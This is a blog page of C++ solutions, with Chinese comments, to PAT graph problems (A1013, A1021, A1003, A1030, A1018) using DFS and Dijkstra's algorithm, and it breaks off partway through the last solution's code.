<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1013</span></span><br><span class="line"><span class="comment">//分析完后，如果用DFS就是求连通块</span></span><br><span class="line"><span class="comment">//DFS+建立邻接表+否访问过的数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1010</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; B[maxn];</span><br><span class="line"><span class="keyword">bool</span> visit[maxn]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> deletePoint;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index==deletePoint) <span class="keyword">return</span>;</span><br><span class="line">    visit[index]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;B[index].size();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[B[index][i]]==<span class="literal">false</span>)</span><br><span class="line">            DFS(B[index][i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        B[a].push_back(b);</span><br><span class="line">        B[b].push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;deletePoint);</span><br><span class="line">        <span class="built_in">memset</span>(visit,<span class="literal">false</span>,<span class="keyword">sizeof</span>(visit));</span><br><span class="line">        <span class="keyword">int</span> block=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j!=deletePoint &amp;&amp; visit[j]==<span class="literal">false</span>)&#123;</span><br><span class="line">                DFS(j);</span><br><span class="line">                block++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,block<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1021</span></span><br><span class="line"><span class="comment">// DFS 看是否连通</span></span><br><span class="line"><span class="comment">// 这题按正常思路做的，23分，有一个节点超时了</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">10010</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; G[MAXN];</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; best;</span><br><span class="line"><span class="keyword">bool</span> visit[MAXN]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> max_depth=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    visit[index]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(depth&gt;max_depth)&#123;</span><br><span class="line">        best.clear();</span><br><span class="line">        best.insert(index);</span><br><span class="line">        max_depth=depth;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(depth==max_depth)&#123;</span><br><span class="line">        best.insert(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G[index].size();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[G[index][i]]==<span class="literal">false</span>)&#123;</span><br><span class="line">            DFS(G[index][i],depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    visit[index]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G[index].size();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[G[index][i]]==<span class="literal">false</span>)&#123;</span><br><span class="line">            dfs(G[index][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        G[a].push_back(b);</span><br><span class="line">        G[b].push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 先求是否连通</span></span><br><span class="line">    <span class="keyword">int</span> blocks=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[i]==<span class="literal">false</span>)&#123;</span><br><span class="line">            dfs(i);</span><br><span class="line">            blocks++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(blocks&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: %d components&quot;</span>,blocks);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若连通，求定点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(visit,<span class="literal">false</span>,<span class="keyword">sizeof</span>(visit));</span><br><span class="line">        DFS(i,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[i]==<span class="literal">true</span>)</span><br><span class="line">            num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(it=best.begin();it!=best.end();it++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,*it);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-4"><a href="#10-4" class="headerlink" title="10.4"></a>10.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1003</span></span><br><span class="line"><span class="comment">//节点不超过1000个，就用邻接矩阵了</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">510</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1000000000</span>;</span><br><span class="line"><span class="keyword">int</span> G[MAXN][MAXN];</span><br><span class="line"><span class="keyword">bool</span> visit[MAXN];</span><br><span class="line"><span class="keyword">int</span> rescue[MAXN]; <span class="comment">//点权</span></span><br><span class="line"><span class="keyword">int</span> num[MAXN]; <span class="comment">//最短路径条数</span></span><br><span class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">//最短路径</span></span><br><span class="line"><span class="keyword">int</span> w[MAXN]; <span class="comment">//最大点权之和</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> start)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fill(d,d+MAXN,INF);</span><br><span class="line">    <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="keyword">sizeof</span>(num));</span><br><span class="line">    <span class="built_in">memset</span>(w,<span class="number">0</span>,<span class="keyword">sizeof</span>(w));</span><br><span class="line">    d[start]=<span class="number">0</span>;</span><br><span class="line">    w[start]=rescue[start];</span><br><span class="line">    num[start]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u=<span class="number">-1</span>,MIN=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[j]==<span class="literal">false</span>&amp;&amp;d[j]&lt;MIN)&#123;</span><br><span class="line">                u=j;</span><br><span class="line">                MIN=d[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(u==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        visit[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v=<span class="number">0</span>;v&lt;n;v++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[v]==<span class="literal">false</span>&amp;&amp;G[u][v]!=INF)&#123;</span><br><span class="line">                <span class="keyword">if</span>(d[u]+G[u][v]&lt;d[v])&#123;</span><br><span class="line">                    d[v]=d[u]+G[u][v];</span><br><span class="line">                    w[v]=w[u]+rescue[v];</span><br><span class="line">                    num[v]=num[u];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(visit[v]==<span class="literal">false</span>&amp;&amp;d[u]+G[u][v]==d[v])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(w[u]+rescue[v]&gt;w[v])&#123;</span><br><span class="line">                        w[v]=w[u]+rescue[v];</span><br><span class="line">                    &#125;</span><br><span class="line">                    num[v]+=num[u];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fill(G[<span class="number">0</span>],G[<span class="number">0</span>]+MAXN*MAXN,INF);</span><br><span class="line">    <span class="keyword">int</span> m,c1,c2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;c1,&amp;c2);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        visit[i]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> temp1,temp2,temp3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp1);</span><br><span class="line">        rescue[i]=temp1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;temp1,&amp;temp2,&amp;temp3);</span><br><span class="line">        G[temp1][temp2]=temp3;</span><br><span class="line">        G[temp2][temp1]=temp3;</span><br><span class="line">    &#125;</span><br><span class="line">    Dijkstra(c1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,num[c2],w[c2]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><code>纯Dijkstra</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1030</span></span><br><span class="line"><span class="comment">//如果用纯dijkstra的话，思路上上一题一模一样</span></span><br><span class="line"><span class="comment">//唯一的区别就是要开一个pre</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">510</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1000000000</span>;</span><br><span class="line"><span class="keyword">int</span> G[MAXN][MAXN];  <span class="comment">// 邻接矩阵</span></span><br><span class="line"><span class="keyword">bool</span> visit[MAXN]=&#123;<span class="literal">false</span>&#125;;  <span class="comment">// 访问情况</span></span><br><span class="line"><span class="keyword">int</span> cost[MAXN][MAXN]; <span class="comment">//边权</span></span><br><span class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">//最短路径</span></span><br><span class="line"><span class="keyword">int</span> c[MAXN]; <span class="comment">//最大边权之和</span></span><br><span class="line"><span class="keyword">int</span> pre[MAXN]; <span class="comment">//前一站</span></span><br><span class="line"><span class="keyword">int</span> n,m,st,ed;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fill(d,d+MAXN,INF);</span><br><span class="line">    fill(c,c+MAXN,INF);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) pre[i]=i;</span><br><span class="line">    d[s]=<span class="number">0</span>;</span><br><span class="line">    c[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u=<span class="number">-1</span>,MIN=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[j]==<span class="literal">false</span>&amp;&amp;d[j]&lt;MIN)&#123;</span><br><span class="line">                u=j;</span><br><span class="line">                MIN=d[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(u==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        visit[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v=<span class="number">0</span>;v&lt;n;v++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[v]==<span class="literal">false</span>&amp;&amp;G[u][v]!=INF)&#123;</span><br><span class="line">                <span class="keyword">if</span>(d[v]&gt;G[u][v]+d[u])&#123;</span><br><span class="line">                   d[v]=G[u][v]+d[u];</span><br><span class="line">                   c[v]=cost[u][v]+c[u];</span><br><span class="line">                   pre[v]=u;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(d[v]==G[u][v]+d[u])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(c[u]+cost[u][v]&lt;c[v])&#123;</span><br><span class="line">                        c[v]=cost[u][v]+c[u];</span><br><span class="line">                        pre[v]=u;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(v==st)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,v);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(pre[v]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fill(G[<span class="number">0</span>],G[<span class="number">0</span>]+MAXN*MAXN,INF);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;st,&amp;ed);</span><br><span class="line">    <span class="keyword">int</span> u,v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;G[u][v],&amp;cost[u][v]);</span><br><span class="line">        G[v][u]=G[u][v];</span><br><span class="line">        cost[v][u]=cost[u][v];</span><br><span class="line">    &#125;</span><br><span class="line">    Dijkstra(st);</span><br><span class="line">    DFS(ed);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,d[ed],c[ed]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1018</span></span><br><span class="line"><span class="comment">//读题目都读了一会儿，条件比较复杂</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">510</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1000000000</span>;</span><br><span class="line"><span class="keyword">int</span> c,n,s,m;</span><br><span class="line"><span class="keyword">int</span> G[MAXN][MAXN];  <span class="comment">// 邻接矩阵</span></span><br><span class="line"><span class="keyword">bool</span> vis[MAXN]=&#123;<span class="literal">false</span>&#125;;  <span class="comment">//访问数组</span></span><br><span class="line"><span class="keyword">int</span> dot[MAXN]; <span class="comment">//点权</span></span><br><span class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">//最短路径</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pre[MAXN]; <span class="comment">//前序</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; path,tempath;</span><br><span class="line"><span class="keyword">int</span> minNeed=INF,minRemain=INF;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fill(d,d+MAXN,INF);</span><br><span class="line">    <span class="comment">//fill(cost,cost+MAXN,INF);</span></span><br><span class="line">    d[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//循环n+1次</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u=<span class="number">-1</span>,MIN=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>&amp;&amp;d[j]&lt;MIN)&#123;</span><br><span class="line">                u=j;</span><br><span class="line">                MIN=d[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(u==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        vis[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v=<span class="number">0</span>;v&lt;=n;v++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[v]==<span class="literal">false</span>&amp;&amp;G[u][v]!=INF)&#123;</span><br><span class="line">                <span class="keyword">if</span>(d[u]+G[u][v]&lt;d[v])&#123;</span><br><span class="line">                    d[v]=d[u]+G[u][v];</span><br><span class="line">                    pre[v].clear();</span><br><span class="line">                    pre[v].push_back(u);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(d[u]+G[u][v]==d[v])&#123;</span><br><span class="line">                    pre[v].push_back(u);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(v==<span class="number">0</span>)&#123;</span><br><span class="line">        tempath.push_back(v);</span><br><span class="line">        <span 